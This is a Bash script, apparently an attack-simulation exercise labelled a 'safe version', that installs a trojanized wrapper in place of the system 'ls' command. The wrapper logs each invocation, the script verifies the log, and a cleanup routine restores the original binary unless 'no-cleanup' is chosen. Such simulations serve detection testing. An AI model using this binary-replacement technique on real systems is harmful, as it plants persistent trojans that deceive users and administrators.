#!/bin/bash

# 시나리오 1-2: 루트킷 설치 (시스템 명령어 교체) [SAFE VERSION]

LOG_PREFIX="[ATTACKER]"

log_attack() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') $LOG_PREFIX $1"
}

REAL_LS_PATH=$(which ls)
MALICIOUS_LS_PATH="/tmp/malicious_ls"
ROOTKIT_LOG="/tmp/rootkit_activity.log"

# --- 함수 정의 ---
install() {
    log_attack "Scenario 1-2: Rootkit Installation START"
    echo "------------------------------------------------------------------"
    
    if [ "$EUID" -ne 0 ]; then
      log_attack "ERROR: This part must be run with 'sudo'."
      exit 1
    fi
    
    if [ -f "$REAL_LS_PATH.bak" ]; then
        log_attack "ERROR: Backup file '$REAL_LS_PATH.bak' already exists. Cannot proceed."
        exit 1
    fi

    log_attack "Phase 1: Preparing malicious 'ls' rootkit..."
    cat > $MALICIOUS_LS_PATH <<- EOF
#!/bin/bash
# Trojanized 'ls' command
$REAL_LS_PATH.bak "\$@"
echo "ROOTKIT backdoor activated by \$(whoami) at \$(date)" >> $ROOTKIT_LOG
EOF
    chmod +x $MALICIOUS_LS_PATH
    sleep 2

    log_attack "Phase 2: Installing rootkit..."
    mv $REAL_LS_PATH $REAL_LS_PATH.bak
    cp $MALICIOUS_LS_PATH $REAL_LS_PATH
    sleep 2

    log_attack "Phase 3: Activating rootkit by running 'ls'..."
    ls -la /etc/ > /dev/null
    sleep 1
    
    if [ -f "$ROOTKIT_LOG" ]; then
        log_attack "SUCCESS: Rootkit payload executed."
        cat $ROOTKIT_LOG
    fi
}

cleanup() {
    log_attack "Cleanup: Restoring system..."
    
    # 1. 백업이 있으면 복구
    if [ -f "$REAL_LS_PATH.bak" ]; then
        mv -f $REAL_LS_PATH.bak $REAL_LS_PATH
        log_attack "Original '$REAL_LS_PATH' restored."
    fi
    
    # 2. 악성 파일 제거
    rm -f $MALICIOUS_LS_PATH
    rm -f $ROOTKIT_LOG
    
    # 3. 권한 복구 (원본 ls의 권한으로)
    if [ -f "$REAL_LS_PATH" ]; then
        chmod 755 $REAL_LS_PATH
        chown root:root $REAL_LS_PATH
    fi
    
    log_attack "Cleanup completed."
}

# 스크립트 시작 시 강제 cleanup 옵션
if [ "$1" == "force-cleanup" ]; then
    cleanup
    exit 0
fi

# --- 메인 실행 로직 ---
case "$1" in
    "")
        install
        cleanup
        ;;
    "no-cleanup")
        install
        ;;
    "cleanup")
        cleanup
        ;;
    *)
        echo "Usage: $0 [no-cleanup|cleanup]"
        exit 1
        ;;
esac

log_attack "Scenario 1-2: Simulation FINISHED."